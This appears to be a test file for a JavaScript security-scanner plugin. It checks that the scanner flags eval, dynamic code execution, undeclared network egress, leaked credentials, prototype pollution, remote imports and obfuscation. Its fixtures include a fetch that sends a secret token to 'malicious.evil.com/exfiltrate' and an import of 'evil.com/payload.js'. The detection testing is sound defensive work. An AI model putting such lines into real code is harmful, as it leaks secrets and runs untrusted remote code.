import { describe, expect, it } from 'vitest'
import { Context } from 'cordis'
import { apply, scanCode } from './index.js'

describe('SecurityAuditPlugin & scanner', () => {
  it('passes benign clean code', () => {
    const code = `
      export function playSong(id) {
        const url = 'https://api.example.com/tracks/' + id;
        return fetch(url).then(r => r.json());
      }
    `
    const report = scanCode(code, { allowedHosts: ['api.example.com'] })
    expect(report.level).toBe('pass')
    expect(report.findings).toHaveLength(0)
  })

  it('detects eval and marks as block', () => {
    const code = `
      function run(data) {
        return eval(data);
      }
    `
    const report = scanCode(code)
    expect(report.level).toBe('block')
    expect(report.findings.some((f) => f.ruleId === 'eval-function-constructor')).toBe(true)
  })

  it('detects new Function constructor and marks as block', () => {
    const code = `
      const fn = new Function('a', 'b', 'return a + b');
    `
    const report = scanCode(code)
    expect(report.level).toBe('block')
    expect(report.findings.some((f) => f.ruleId === 'eval-function-constructor')).toBe(true)
  })

  it('detects dynamic timer code execution and vm breakout as block', () => {
    const timerCode = `setTimeout("doBadThings()", 500);`
    const reportTimer = scanCode(timerCode)
    expect(reportTimer.level).toBe('block')
    expect(reportTimer.findings.some((f) => f.ruleId === 'dynamic-code-execution')).toBe(true)

    const vmCode = `const vm = require('vm'); vm.runInThisContext('code');`
    const reportVm = scanCode(vmCode)
    expect(reportVm.level).toBe('block')
    expect(reportVm.findings.some((f) => f.ruleId === 'dynamic-code-execution')).toBe(true)
  })

  it('flags undeclared host network egress as block, allows declared hosts', () => {
    const code = `
      fetch('https://malicious.evil.com/exfiltrate?token=' + secret);
      fetch('https://api.legit.com/data');
    `
    // Only api.legit.com is allowed
    const report = scanCode(code, { allowedHosts: ['api.legit.com'] })
    expect(report.level).toBe('block')
    const hostFindings = report.findings.filter((f) => f.ruleId === 'undeclared-host-egress')
    expect(hostFindings).toHaveLength(1)
    expect(hostFindings[0]?.message).toContain('malicious.evil.com')
  })

  it('supports wildcard allowedHosts (*.domain.com)', () => {
    const code = `
      fetch('https://sub.cdn.example.org/audio.mp3');
    `
    const report = scanCode(code, { allowedHosts: ['*.example.org'] })
    expect(report.level).toBe('pass')
  })

  it('flags hardcoded private keys and API tokens as block', () => {
    const privKeyCode = `
      const key = "-----BEGIN RSA PRIVATE KEY-----\\nMIIEowIBAAKCAQEA0...";
    `
    const reportPriv = scanCode(privKeyCode)
    expect(reportPriv.level).toBe('block')
    expect(reportPriv.findings.some((f) => f.ruleId === 'credential-private-key')).toBe(true)

    const tokenCode = `
      const ghToken = "ghp_123456789012345678901234567890123456";
    `
    const reportToken = scanCode(tokenCode)
    expect(reportToken.level).toBe('block')
    expect(reportToken.findings.some((f) => f.ruleId === 'credential-api-token')).toBe(true)
  })

  it('flags prototype pollution vectors as block', () => {
    const protoCode = `
      obj.__proto__.polluted = true;
    `
    const reportProto = scanCode(protoCode)
    expect(reportProto.level).toBe('block')
    expect(reportProto.findings.some((f) => f.ruleId === 'prototype-pollution')).toBe(true)

    const ctorCode = `
      function hook() {
        Object.prototype['admin'] = true;
      }
    `
    const reportCtor = scanCode(ctorCode)
    expect(reportCtor.level).toBe('block')
    expect(reportCtor.findings.some((f) => f.ruleId === 'prototype-pollution')).toBe(true)
  })

  it('flags remote dynamic import() as block', () => {
    const code = `
      const remoteMod = await import('https://evil.com/payload.js');
    `
    const report = scanCode(code)
    expect(report.level).toBe('block')
    expect(report.findings.some((f) => f.ruleId === 'remote-dynamic-import')).toBe(true)
  })

  it('detects obfuscation features (dense hex and packer) as block', () => {
    const denseHexCode = `
      const msg = "\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64";
    `
    const reportHex = scanCode(denseHexCode)
    expect(reportHex.level).toBe('block')
    expect(reportHex.findings.some((f) => f.ruleId === 'obfuscation-dense-hex')).toBe(true)

    const packerCode = `
      eval(function(p,a,c,k,e,d){e=function(c){return c};return p}('0',1,1,'a'.split('|'),0,{}))
    `
    const reportPacker = scanCode(packerCode)
    expect(reportPacker.level).toBe('block')
    expect(reportPacker.findings.some((f) => f.ruleId === 'obfuscation-packer')).toBe(true)
  })

  it('detects high entropy strings as warn', () => {
    // 64 random characters Base64 with high Shannon entropy
    const highEntropyCode = `
      const secret = "a9BfK3mQxZ8vL2wYp0jN7hG4rD1sC6tU8eI5oP4yT1vX3zQ7mW8bV0cL9kH2jF5d";
    `
    const report = scanCode(highEntropyCode)
    expect(report.level).toBe('warn')
    expect(report.findings.some((f) => f.ruleId === 'high-entropy-string')).toBe(true)
  })

  it('registers and provides ctx.securityAudit service via Cordis DI', async () => {
    const ctx = new Context()
    await apply(ctx)

    expect(ctx.securityAudit).toBeDefined()
    const report = ctx.securityAudit.scan('eval("1+1")', {})
    expect(report.level).toBe('block')
  })
})
